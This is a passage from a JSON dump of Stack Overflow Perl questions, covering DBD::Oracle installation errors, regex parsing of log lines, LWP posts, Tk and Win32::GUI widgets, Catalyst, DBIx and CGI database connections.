:)</p>\n\n<p>EDIT: Totally forgot perl version -_- Sidenote: I can't upgrade perl, as I need libraries that are stuck with 5.8 :/</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>C:\\&gt; perl -version\nThis is perl, v5.8.8 built for MSWin32-x86-multi-thread\n(with 50 registered patches, see perl -V for more detail)\n\nCopyright 1987-2006, Larry Wall\n\nBinary build 820 [274739] provided by ActiveState http://www.ActiveState.com\nBuilt Jan 23 2007 15:57:46\n</code></pre>\n"},{"tags":["mysql","arrays","perl","hash"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12483138,"title":"Perl Hash of Arrays using Column Data as Keys","body":"<p>My SQL database has three columns; <code>Key</code>, <code>Topic</code>, and <code>Value</code>.  There are duplicate topics that have different values.  Here is a sample:</p>\n\n<pre><code> Key    Topic  Value\n -----  -----  -----\n 1      Book      20\n 2      Toy       10\n 3      Toy       30\n 4      Pet      100\n 5      Book      15\n .      .          .\n .      .          .\n</code></pre>\n\n<p>Using Perl, how do I create a hash from the column <code>Topic</code> (<code>%Topic</code>) that uses each unique key in <code>Topic</code> as an array that has the corresponding values for its elements: <code>@Book = 20, 15, ...</code>, <code>@Toy = 10, 30, ...</code>, <code>@Pet = 100, ...</code>. </p>\n"},{"tags":["perl","oracle","oracle11g","solaris","cpan"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":257,"score":1,"question_id":10953511,"title":"Error When Trying to Install DBD::Oracle with CPANM","body":"<p>Okay, so I was trying to install a combination of the CGI module, DBI module, and DBD::Oracle driver using CPANM on a 64bit Solaris 11 machine with an Oracle11g database.</p>\n\n<p>I installed that latest version of Perl using Perlbrew, updated CPANM, and then did the following...</p>\n\n<pre><code>cpanm -v -f -i CGI\ncpanm -v -f -i DBI\n</code></pre>\n\n<p>And both of those modules installed fine, the DBI did have a small test error (t/zvxnp_85gofer.t) when I tried to install it normally, but the force install seemed to work.</p>\n\n<p>So then I went to try to install the final part that I needed:</p>\n\n<pre><code>cpanm -v -f -i DBD::Oracle\n</code></pre>\n\n<p>And this was the error that came out towards the end of the installation...</p>\n\n<pre><code>Running Mkbootstrap for DBD::Oracle ()\nchmod 644 Oracle.bs\nrm -f blib/arch/auto/DBD/Oracle/Oracle.so\nLD_RUN_PATH=\"/opt/oracle/rdbms/lib\" gcc  -G -L/usr/gnu/lib -fstack-protector Oracle.o  dbdimp.o  oci8.o  -o blib/arch/auto/DBD/Oracle/Oracle.so     \\\n   -L/opt/oracle/rdbms/lib/ -lclntsh -lkstat -lnsl -lsocket -lresolv -lgen -ldl -lsched -lrt -R/opt/oracle/rdbms/lib -laio -lposix4 -lkstat -lm -lpthread   \\\n\nld: fatal: file /opt/oracle/rdbms/lib//libclntsh.so: wrong ELF class: ELFCLASS64\nld: fatal: file processing errors. No output written to blib/arch/auto/DBD/Oracle/Oracle.so\ncollect2: ld returned 1 exit status\n*** Error code 1\nmake: Fatal error: Command failed for target `blib/arch/auto/DBD/Oracle/Oracle.so'\nFAIL\n! Installing DBD::Oracle failed. See /home/oracle/.cpanm/build.log for details.\n</code></pre>\n\n<p>I'm guessing just from the <code>wrong ELF class: ELFCLASS64</code> it has to do with some mismatch between the 64 bit binaries that exist and that this driver requires the 32 bit binaries to install? Some research has indicated that I need to find the lib32 directory to continue the installation, but I can't seem to find it.</p>\n\n<p>I did:</p>\n\n<p><code>echo $ORACLE_HOME</code> ---> /opt/oracle/rdbms\n<br>\n<code>ls $ORACLE_HOME</code></p>\n\n<p>That returned the following directories...</p>\n\n<pre><code>apex              emcli             mgw               rdbms\nassistants        has               network           relnotes\nbin               hs                nls               root.sh\nccr               ide               oc4j              scheduler\ncdata             install           odbc              slax\ncfgtoollogs       install.platform  olap              sqldeveloper\nclone             instantclient     ons               sqlj\nconfig            inventory         OPatch            sqlplus\ncrs               j2ee              opmn              srvm\ncsmig             javavm            oracore           sysman\ncss               jdbc              oraInst.loc       timingframework\nctx               jdev              ord               ucp\ncv                jdk               oui               uix\ndbs               jlib              owb               utl\ndc_ocm            ldap              owm               wwg\ndeinstall         lib64             perl              xdk\ndemo              log               plsql\ndiagnostics       md                precomp\ndv                mesg              racg\n</code></pre>\n\n<p>So I see a lib64, but no lib or lib32. Has anyone ever had this problem before, found a solution to it, or know how I could continue from here?</p>\n"},{"tags":["perl","append","lines"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12475665,"title":"append string to every line starting from second","body":"<p>I have an file as shown</p>\n\n<pre><code>    ford\n    speed ....\n    hyundai\n    speed ...\n    ferrari\n    speed ....\n    BMW\n    Merc\n    lambo\n    speed ...\n</code></pre>\n\n<p>I want to search for \"speed\" in every alternate line staring from 2nd, and if not found i want to append \"speed\\n\".\ni.e. i want my output to be</p>\n\n<pre><code>        ford\n        speed ....\n        hyundai\n        speed ...\n        ferrari\n        speed ....\n        BMW\n        speed\n        Merc\n        speed\n        lambo\n        speed ...\n</code></pre>\n\n<p>Is there any oneliner that can be used for the above problem like the one used to append to each line like </p>\n\n<pre><code>perl -ple 's/^/speed/' filename\n</code></pre>\n"},{"tags":["perl","pattern-matching"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":74,"score":-2,"question_id":12489093,"title":"pattern matching in a single line in perl","body":"<p>I have a scalar whose value will be like this.</p>\n\n<pre><code>Sun Sep  9 12:14:56 2012 : [Pro] Write to file(/root/mesh/MeshBed/trunk/meshproc/neighInfo/neighbors-list_152.    14.189.6) : #ip=152.14.189.99 neighinfo=NULL mac=06:02:6F:A7:3E:BC#\n</code></pre>\n\n<p>I want to take the Timefield (12:14:38) and the ip (152.14.189.99) from this in perl. I tried using this..</p>\n\n<pre><code>$p =~ /ip\\=(\\.\\d+\\.\\d+\\.\\d+\\d+)/;\nprint $1;\n</code></pre>\n\n<p>This is throwing compilation error. Can anyone solve this.</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse warnings;\n\nmy $p = \"Sun Sep  9 12:14:56 2012 : [Pro] Write to file(/root/mesh/MeshBed/trunk/meshproc/neighInfo/neighbors-list_152.    14.189.6) : #ip=152.14.189.99 neighinfo=NULL mac=06:02:6F:A7:3E:BC#\";\n\n$p =~ /ip\\=(\\.\\d+\\.\\d+\\.\\d+\\d+)/;\n\nprint $1;\n</code></pre>\n"},{"tags":["perl","cgi","lwp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12487902,"title":"perl lwp form post","body":"<p>I'm trying to use LWP to post some content to a hosted service, over which I have no control, i.e. I must conform to their standards.</p>\n\n<p>Basically, the content must go over in a post which looks similar to the following:</p>\n\n<pre><code>POST / HTTP/1.1\nAccept:*/*\nContent-Type: text/xml\n[various other headers]\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;xmlContent&gt;here&lt;/xmlContent&gt;\n</code></pre>\n\n<p>I'm looking at the LWP documentation, and its example looks like this:</p>\n\n<pre><code>$response = $browser-&gt;post( $url,\n   ['form' =&gt; '&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;content&gt;foobarbaz&lt;/content&gt;'],\n   'Content_Type' =&gt; 'text/xml', \n   'headerkey2' =&gt; 'hvalue2', \n );\n</code></pre>\n\n<p>so instead, my data is going over like this:</p>\n\n<pre><code>[headers]\n\nform=&lt;?xml blah blah blah\n</code></pre>\n\n<p>I don't want the \"form=\" in there.</p>\n\n<p>I've tried a few work-arounds, but I either end up with nothing getting sent, or with an extra '=' sign at the end.  It seems like this should be easy... is there any way I can get my content to go as the body of the post WITHOUT the variable name?</p>\n\n<p>I'm open to doing things other than using LWP, that was just my jumping off point because I've used it before.</p>\n\n<p>Thanks!</p>\n"},{"tags":["c++","perl","linker","make","xs"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12483232,"title":"Linker dependencies when mixing static and shared libraries","body":"<p>I have a following question about linking on Linux:</p>\n\n<p>Suppose I have a class Foo that uses Qt. To build this class I'd have to use qmake to generate Makefile.</p>\n\n<p>Later on I want to use this class Foo for a Perl module, which is a shared library. However, to build it I have to use Perl's MakeMaker to generate Makefile of it's own.</p>\n\n<p>The way I'm doing it right now is that I build class Foo as a static library, and when building Perl module's shared library I'm linking it against Foo's static library.</p>\n\n<p>The problem is that when building Perl module's shared library I have to link it against all those Qt libraries that Foo's static library is linked against.</p>\n\n<p>So the question is:</p>\n\n<ol>\n<li><p>Does this approach even make sense?!</p></li>\n<li><p>Is it possible to build Foo's static library in a way that I wouldn't have to specify all it's dependencies when building the Perl module's shared library? (Because it is somewhat hard to add all those dependencies to module's Makefile)</p></li>\n<li><p>Would it be any different if Foo's library was shared, not static?</p></li>\n</ol>\n"},{"tags":["perl","tk","perltk","hlist"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12466585,"title":"How do I remove the dotted line of the selection in a Tk::HList?","body":"<p>when an entry in a Tk::HList is selected by a single click, a dotted line is drawn around this entry. I don't want to have this line. How can I configure it? I don't see any documented way to do it.</p>\n\n<p>Here is some example code showing a Tk::HList with a pre-selected entry. When you click the entry, a dotted line will appear.</p>\n\n<pre><code>#!perl\n\nuse strict;\nuse warnings;\nuse utf8;\nuse Tk;\nuse Tk::HList;\n\nmy $mw = tkinit();\n\n# -- create a Tk::HList\nmy $scrolled_hlist = $mw-&gt;Scrolled('HList',\n    -scrollbars =&gt; 'se',\n    -columns =&gt; 2,\n    -header =&gt; 1,\n    -width =&gt; 50,\n    -height =&gt; 20,\n    # hide black border around HList when it's active\n    -highlightthickness =&gt; 0,\n    -selectborderwidth =&gt; 1,\n    -selectmode =&gt; 'single',\n\n)-&gt;pack(-fill =&gt; 'y', -expand =&gt; 1,);\n\nmy $real_hlist = $scrolled_hlist-&gt;Subwidget('scrolled');\n\n\n# -- add HList header colums\n$real_hlist-&gt;header(\n    'create', 0,\n    -text   =&gt; 'first column',\n);\n\n$real_hlist-&gt;header(\n    'create', 1,\n    -text   =&gt; 'second column',\n);\n\n\n# -- add some entries to the HList\n$real_hlist-&gt;add(1);\n$real_hlist-&gt;item('create', 1, 0, -text =&gt; 'first row, 1st col');\n$real_hlist-&gt;item('create', 1, 1, -text =&gt; 'first row, 2nd col');\n\n$real_hlist-&gt;add(2);\n$real_hlist-&gt;item('create', 2, 0, -text =&gt; '2nd row, 1st col');\n$real_hlist-&gt;item('create', 2, 1, -text =&gt; 'second row, 2nd col');\n\n\n# -- set selection *** without dashed line border ***\n$real_hlist-&gt;selectionSet(2);\n\n$mw-&gt;MainLoop();\nexit(0);\n</code></pre>\n"},{"tags":["python","perl","bash","shell"],"answer_count":7,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12479712,"title":"removing numeric value from a string","body":"<p>I have a file of 2000 rows and 1 column</p>\n\n<pre><code>1007_s_at1\n1007_s_at2\n1007_s_at3\n1007_s_at4\n1007_s_at5\n1007_s_at6\n1007_s_at7\n1007_s_at8\n1007_s_at9\n1007_s_at10\n</code></pre>\n\n<p>looks like above, I want to remove the last numeric value after \"at\". In principle whatever number is in the last should be truncated.</p>\n\n<p>I have tried things like splitting them and then rejoioning it, but it just complicates the problem and I am far away from answer.</p>\n\n<p>Could you please suggest something in bash or shell or python or perl to solve this.</p>\n\n<p>An output like below is desired</p>\n\n<pre><code>   1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["perl","windows-7","message"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12483705,"title":"Execute code when receiving SUSPEND and APMRESUME messages","body":"<p>How do I \"catch\" a SUSPEND and a APMRESUME messages in windows using perl?</p>\n\n<p>The objective is to make a program where it is a good idea to warn the server about the user disconnection whenever it's possible.</p>\n\n<p>I already tried to search in many places how to do this. I can only find how to do in .net using/or C# but I can't find for perl.</p>\n"},{"tags":["perl","shell","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12483722,"title":"perl line matching between the lines","body":"<p>I have a file.</p>\n\n<pre><code>Sun Sep  9 12:34:42 2012 : Sun Sep  9 12:34:42 2012 : [Req] Send Bcast \nSun Sep  9 12:34:32 2012 : RX FROM :152.14.189.4 MESG: \nSun Sep  9 12:34:32 2012 : info  \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.4 \nSun Sep  9 12:34:32 2012 : RX FROM :13 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.13  \nSun Sep  9 12:34:32 2012 : RX FROM :9 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.9  \nSun Sep  9 12:34:32 2012 : RX FROM :14 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.14 \nSun Sep  9 12:34:32 2012 : RX FROM :5 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.5 \nSun Sep  9 12:34:35 2012 : Reply back to 9 \nSun Sep  9 12:34:35 2012 : Reply back to 13\nSun Sep  9 12:34:36 2012 : Reply back to 14\nSun Sep  9 12:34:37 2012 : Reply back to 1.1.1.4 \nSun Sep  9 12:34:37 2012 : Reply back to 5 \nSun Sep  9 12:34:42 2012 : Sun Sep  9 12:34:42 2012 : [Req] Send Bcast \nSun Sep  9 12:34:32 2012 : RX FROM :152.14.189.4 MESG: \nSun Sep  9 12:34:32 2012 : info  \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.5 \nSun Sep  9 12:34:32 2012 : RX FROM :13 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.9  \nSun Sep  9 12:34:32 2012 : RX FROM :9 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.4  \nSun Sep  9 12:34:32 2012 : RX FROM :14 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.13 \nSun Sep  9 12:34:32 2012 : RX FROM :5 \nSun Sep  9 12:34:32 2012 : #ip=1.1.1.14 \nSun Sep  9 12:34:35 2012 : Reply back to 9 \nSun Sep  9 12:34:35 2012 : Reply back to 14\nSun Sep  9 12:34:36 2012 : Reply back to 13\nSun Sep  9 12:34:37 2012 : Reply back to 4 \nSun Sep  9 12:34:37 2012 : Reply back to 5 \n</code></pre>\n\n<p>Between Two lines \"Bcast\" I need to search for a value say 1.1.1.4 and if it is present at both ip=1.1.1.1 and Reply back to 1.1.1.4. Then I need to ignore that set. Else I need to write the differences in two separate files. I tried doing that in perl. When I to search between Bcast and Bcast, nothing is getting printed. Am i missing anything?\nHere is what i have written</p>\n\n<pre><code>open my $in,'&lt;',$ARGV[0];\nopen my $out,'&gt;',\"File2.txt\";\nmy $Flag =0;\nwhile(&lt;$in&gt;){\n        if (/Bcast/ .. /Bcast/)\n        {\n          print ;\n          if ( ($_ =~ m{ ip=1\\.1\\.1\\.4 }xms) )\n          {\n                  $Flag=$Flag+1;\n                  print \" \\nMatch is Found !!! Hurray \\n\" if ($Flag==2);\n          }       \n        } \n      $Flag=0;\n}   \n</code></pre>\n\n<p>Kindly help me</p>\n"},{"tags":["perl","catalyst"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12461630,"title":"Testing with two versions of Catalyst on the same system/application","body":"<p>I'm trying to test a client's Catalyst application that works with <code>Catalyst 5.8</code> and has some serious problems with <code>Catalyst 5.9</code>. </p>\n\n<p>I'm having to do this on their test system where the application [which has a complex and messy install too] is running with <code>Catalyst 5.8</code>.</p>\n\n<p>I'm wondering whether there's a clean way of switching back and forwards? </p>\n\n<p>I'm thinking, for example,  install 5.9 in a custom directory, go use <code>Catalyst::Runtime '5.80';</code> or <code>use Catalyst::Runtime '5.90';</code> and switch <code>@INC</code> around to suit. </p>\n\n<p>However, Because of some of the deeper changes, I suspect that the application might have to be re-built for 5.9 anyway.</p>\n\n<p>I can't really make a lot of deep changes to the environment, it's not my system, so it's an implementation problem and a coding one, all mixed up.</p>\n\n<p>Any commentary on this welcome, I'm not a deep Catalyst expert, so I'm hoping for a simple way to do this.</p>\n"},{"tags":["perl","deployment","installation","cpan","perl-module"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":791,"score":4,"question_id":1708332,"title":"How do I install deps for CPAN module without installing it?","body":"<p>This is a follow-up to my previous question <a href=\"http://stackoverflow.com/questions/1679835\">about developing Perl applications</a>. Letâs say I develop an application as a CPAN module using <code>Module::Install</code>. Now I upload the code to the production server, say using a <code>git push</code>, and I would like to install the application dependencies listed in <code>Makefile.PL</code>. If I simply run <code>cpan .</code>, the thing tries to install the application like a regular Perl module, ie. starts to copy the modules and documentation to standard Perl directories all over the system.</p>\n\n<p>Is this the way itâs supposed to be? Do you install the application into the standard Perl directories? I am used to having my Perl applications in one directory with separate <code>lib</code>. Otherwise it seems Iâd have to manage a lot of other things, like installing the resources somewhere on path etc. If I just want to install the deps declared in <code>Makefile.PL</code> and run the application tests to make sure everything works, what should I do?</p>\n\n<p>(Is this documented somewhere? I mean, is there something like best practice for deploying and updating non-trivial Perl applications? Or is everybody doing this his own way?)</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12482488,"title":"Creating a multilevel hash from a list of hashes","body":"<p>I'm trying to write a sub that can take a list of hashes and create a nested list based on the contents of an arbitrary number of fields.  I just can't get the recursion setup correctly. I'm getting a bunch of bug data out of a database and want to group the data on an arbitrary list of fields (team, priority, etc).  I really don't have any example code that I think is even getting close enough</p>\n\n<p>Example below</p>\n\n<p>I have the following DS:</p>\n\n<pre><code>$ds =\n[\n  {\n    foo =&gt; 'A',\n    bar =&gt; 'B',\n    baz =&gt; 'C',\n  },\n  {\n    foo =&gt; 'A',\n    bar =&gt; 'B',\n    baz =&gt; 'F',\n  },\n  {\n    foo =&gt; 'A',\n    bar =&gt; 'D',\n    baz =&gt; 'G',\n  },\n  {\n    foo =&gt; 'R',\n    bar =&gt; 'J',\n    baz =&gt; 'G',\n  }\n]\n</code></pre>\n\n<p>Given the following function call</p>\n\n<pre><code># prototype   groupBy(data, field-1,field-2,field-n)\ngroupBy($ds,'foo','bar');\n</code></pre>\n\n<p>I want the following output</p>\n\n<pre><code>$res = {\n         A =&gt; {\n                B =&gt; [\n                       {\n                         foo =&gt; 'A',\n                         bar =&gt; 'B', \n                         baz =&gt; 'C',\n                       }, \n                       {\n                         foo =&gt; 'A',\n                         bar =&gt; 'B',\n                         baz =&gt; 'F',\n                       }\n                     ],\n                D =&gt; [\n                       {\n                         foo =&gt; 'A',\n                         bar =&gt; 'D',\n                         baz =&gt; 'G', \n                       }\n                     ],\n              },\n         R =&gt; {\n                J =&gt; [\n                       {\n                          foo =&gt; 'R',\n                          bar =&gt; 'J',\n                          baz =&gt; 'G',\n                       }\n              }\n\n        };\n</code></pre>\n"},{"tags":["perl","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12481020,"title":"Read Tab delimited file and count the occurences and delete row","body":"<p>I am fairly new to programming and trying to resolve this problem. I have the file like this. </p>\n\n<pre><code>CHROM    POS     REF     ALT    10_sample.bam   11_sample.bam   12_sample.bam   13_sample.bam   14_sample.bam   15_sample.bam   16_sample.bam \ntg93    77  T   C   T   T   T   T           T\ntg93    79  C   -   C       C   C   -   -   \ntg93    79  C   G   C   C   C   C   G       C\ntg93    80  G   A   G   G   G   G   A   A   G\ntg93    81  A   C   A   A   A   A   C   C   C\ntg93    86  C   A   C   C   A   A   A   A   C\ntg93    105 A   G   A   A   A   A   A   G   A\ntg93    108 A   G   A   A   A   A   G   A   A\ntg93    114 T   C   T   T   T   T   T   C   T\ntg93    131 A   C   A   A   A   A   A   A   A\ntg93    136 G   C   C   G   C   C   G   G   G\ntg93    150 CTCTC   -       CTCTC       -   CTCTC       CTCTC\n</code></pre>\n\n<p>In this file, in the heading</p>\n\n<p>CHROM - name\nPOS - position\nREF - reference\nALT - alternate\n10 - 16_sample.bam - samplesd\nI \nNow i wanted to see how many times the letter in REF and ALT column occured. If either of them is repeated less than two times, i need to delete that row. \nFor example \nIn the first row, i have 'T' in REF and 'C' in ALT . I see in 7 samples, there are 5 T's and 2 blanks and no C. So i need to delete this row.\nIn Second row, REF is 'C' and Alt is '-'. Now in seven samples we have 3 C's, 2 '-'s and 2 blanks. So we keep this row as C and - have repeated more than 2 times. \nAlways we ignore the blanks while counting</p>\n\n<p>The final file after filtering is </p>\n\n<pre><code>#CHROM   POS     REF     ALT    10_sample.bam   11_sample.bam   12_sample.bam   13_sample.bam   14_sample.bam   15_sample.bam   16_sample.bam \ntg93    79  C   -   C       C   C   -   -   \ntg93    80  G   A   G   G   G   G   A   A   G\ntg93    81  A   C   A   A   A   A   C   C   C\ntg93    86  C   A   C   C   A   A   A   A   C\ntg93    136 G   C   C   G   C   C   G   G   G\n</code></pre>\n\n<p>I am able to read the columns in to arrays and display them in the code but i am not sure how to start the loops to read the base and count their occurences and remain the column. Can anyone tell me how i should be proceeding with this? Or it will be helpful if you have any example code i can modify up on. </p>\n\n<p>Thank you for the help !!</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12482306,"title":"Find \"assignment\" (=) operator in a string with regular expression","body":"<p>I know there are real REGEX gurus out there, and I kinda figured there's a patter that will do what I'm looking for. </p>\n\n<p>(note: I'm using perl but can turn around formatting from many regex patterns if you have another favorite)</p>\n\n<p>I'm looking for the assignment operator in strings (code). It doesn't have the be the world's most robust, but needs to be better than \"go find the first =\".</p>\n\n<p>This is simple for a simple test</p>\n\n<pre><code>var a = \"42\";\n</code></pre>\n\n<p>With the above I can say something like</p>\n\n<pre><code>($before, $after) = m/([^=])\\=(.*)/;\n</code></pre>\n\n<p>And I will get the values I need. But once it gets a little more complicated like:</p>\n\n<pre><code>myVar[\"this is my = key\"] = \"and this is my value\";\n</code></pre>\n\n<p>Things get a little more complicated. As you can see there is an \"=\" in a string. I will need to ignore strings (preferably both single and double quoted). </p>\n\n<p>Anyone have a nice little trick for this one? And yes, I have many other patterns that are challenging, but getting this one solved would be a great leap ahead.</p>\n\n<p>I'm not opposed to doing something like replacing any \"=\" found in enclosing quotes, then running my search for my operator. Not sure.</p>\n"},{"tags":["perl","win32gui"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":206,"score":0,"question_id":9834919,"title":"Progress Bar step up Perl Win32::GUI","body":"<p>I am developing a desktop application using perl Win32::GUI. In that I am using Progress Bar for status identification. \nI have set maximum level of progress bar as 100. In that I am step up the value as per the length. \nI have written the sample code below. I am calculating the step up value by dividing 100 to the input length. In that, if the input length is odd number the step value will be float. Hence the progress bar not completed its maximum level completely. \nFor an example, if the length is 11, the step up value will be 9.09. \nThe progress bar takes it as 9 only. So, the progress level completing only 99 segments. Not 100. please share your suggestions.</p>\n\n<pre><code>use strict;\nuse Win32;\nuse Win32::GUI;\n\nmy $DOS = Win32::GUI::GetPerlWindow();                   \nWin32::GUI::Hide($DOS);\n\nmy $Upload_win=Win32::GUI::Window-&gt;new(\n        -name =&gt; 'UploadWindow',\n        -text =&gt; 'SVN-CHIP-Upload-Tool-V2-HurixSystems',\n        -left =&gt; 375,\n        -top  =&gt; 400,\n        -width =&gt;520,#370,\n        -height =&gt;520,\n        #-menu =&gt;$Menu,\n        -background =&gt; [190,190,190],\n        -dialogui   =&gt; 1,\n        -maximizebox =&gt; 0,\n);\n\nmy $ProcessButton=$Upload_win-&gt;AddButton(\n        -text =&gt; 'Upload',\n        -name =&gt;  'uploadbut',\n        -size =&gt; [90,25],\n        -pos  =&gt;  [200,360],\n        -background =&gt;  [190,190,190],\n        -foreground =&gt; [],\n        -tabstop =&gt; 1,\n);\nmy $Progress_bars=$Upload_win-&gt;AddProgressBar(\n  -pos=&gt;[20,400],\n  -background=&gt;[0,255,85],\n  -smooth   =&gt; 1,\n  -size=&gt;[470,20],\n\n);\n\n$Upload_win-&gt;Show();\nWin32::GUI::Dialog();\nWin32::GUI::Hide($DOS);\n\nsub uploadbut_Click{\n\n  $Progress_bars-&gt;SetRange(0,100);\n  my $x=11;\n  my $y=100/$x;\n  for(1..$x){\n  Win32::GUI::DoEvents() &gt;= 0;\n   $Progress_bars-&gt;SetStep($y);\n   $Progress_bars-&gt;StepIt();\n   sleep 1;\n  }\n}\n</code></pre>\n"},{"tags":["perl","perltk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":295,"score":0,"question_id":5992221,"title":"GUI freeze - Perl Tk","body":"<p>I have developed a small application using Perl/Tk. The application will fetch data from the web when one of the buttons in the application is pressed. But the problem is that the GUI gets hang until control is returned. I know this is due to delay so the main window goes unresponsive. I used the update() function but still the problem persists. So I google around and came to know we can use threads to overcome this problem. But I am not sure how to use threads in Perl/Tk. Here is my sample code</p>\n\n<pre><code>use warnings;\nuse Tk;\n\nmy $mw = new MainWindow;\n\nmy $button = $mw -&gt; Button(-text =&gt; \"Fetch\", \n        -command =&gt; \\&amp;FetchData)\n    -&gt; pack();\nMainLoop;\n\nsub FetchData\n{\n//Fetching data from Web\n}\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["mysql","perl","web-applications","relationship","catalyst"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12465489,"title":"Why do I get DBIx \"No such relationship\" error on one of the two clone instances of perl Catalyst?","body":"<p>I replicated a Perl catalyst web application on a new server, making sure catalyst, MySQL, and all required Perl modules have the same versions across both servers. But I keep getting a strange DBIx error message when I try to login on one server.  </p>\n\n<p>This is the error.  </p>\n\n<blockquote>\n  <p>[error] DBIx::Class::ResultSet::search(): No such relationship\n  committee_members on Committee at\n  /mnt/data/www/apps/org/script/../lib/org/Controller/Users.pm line 57\n  [debug] Response Code: 500; Content-Type: text/html; charset=utf-8;\n  Content-Length: 204782</p>\n</blockquote>\n\n<p>The relationship clearly exists in the database. Has any one else had this issue?</p>\n\n<p>Any help is appreciated.</p>\n"},{"tags":["perl","apache","tomcat","cgi","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":112,"score":1,"question_id":12408795,"title":"MySQL connection not working from within Perl CGI script","body":"<p>I can easily connect to a remote MySQL server using the DBI module in my Perl scripts. However, when I try to use the same connection settings/properties from within a CGI script, the connection fails.</p>\n\n<p>There are no helpful errors/warnings being logged either in the apache error log, or the browser, in spite of using</p>\n\n<pre><code>use CGI::Carp qw(warningsToBrowser fatalsToBrowser);\n</code></pre>\n\n<p>Strangely, the exact same script works fine when executed from the terminal. I also tried connecting the CGI script to the MySQL server on localhost, but without any success.</p>\n\n<p>On the other hand, phpMyAdmin works great on the machine.</p>\n\n<p>I'm using CentOS Release 5.8. I'm suspecting it is a system/priveleges issue with the apache user or anywhere else on the OS, but have hit a dead end.</p>\n\n<p>Any pointers would be much appreciated!</p>\n\n<p>Thanks a lot.</p>\n\n<p><em>Edit: I'm using the following connection string</em></p>\n\n<pre><code>$dbh = DBI-&gt;connect($ds, $uname, $pwd,{RaiseError =&gt; 1 }) or die \"$DBI::errstr Could not connect: $!&lt;br&gt;\";\n</code></pre>\n"},{"tags":["perl","perl6","parrot","rakudo","pugs"],"answer_count":4,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":477,"score":12,"question_id":474037,"title":"How do I get started with Perl 6?","body":"<p>I'd like to get your opinion on How to get started with Perl 6?\nShall one use Rakudo which is being build on Parrot or still better go with the Pugs implementation?</p>\n\n<p>If Rakudo, what is the best way to install it? The monthly releases of Parrot, right from the SVN of Parrot, other?</p>\n"},{"tags":["perl","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12474411,"title":"Need a Perl script to match a string in all files inside a directory and push matching ones to new folder","body":"<p>I want a Perl script to search in the mentioned directory and find those files \nwhich contains the string <code>ADMITTING DX</code> and push those files to a new folder.</p>\n\n<p>I am new to Perl and was trying this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse File::Find;\n\nmy $dir    = '/usr/share/uci_cmc/uci_new_files/';\nmy $string = 'ADMITTING DX';\n\nopen my $results, '&gt;', '/home/debarshi/Desktop/results.txt'\n    or die \"Unable to open results file: $!\";\n\nfind(\\&amp;printFile, $dir);\n\nsub printFile {\n\n    return unless -f and /\\.txt$/;\n\n    open my $fh, '&lt;',, $_ or do {\n        warn qq(Unable to open \"$File::Find::name\" for reading: $!);\n        return;\n    };\n\n    while ($fh) {\n        if (/\\Q$string/) {\n            print $results \"$File::Find::name\\n\";\n            return;\n        }\n    }\n}\n</code></pre>\n"},{"tags":["perl","cgi","session-management"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":359,"score":7,"question_id":1618822,"title":"How do I structure my Perl CGI program?","body":"<p>We just got our first major Perl CGI assignment in my CS class.  Our task is to create an mp3 sharing site that allows users to create accounts, log in, share mp3's.  Statistics must be shown of current users, mp3's available, etc. All actions must be written to a log file.  Our code must be secure.</p>\n\n<p>So far, I have implemented each of these actions separately as their own CGI scripts.  For instance, I have a script that draws the login form, the registration form, a script that allows for mp3 uploads, and another that does the mp3 serving.  I've also created a module that posts relevant information to a log file whenever I call an instance of it.  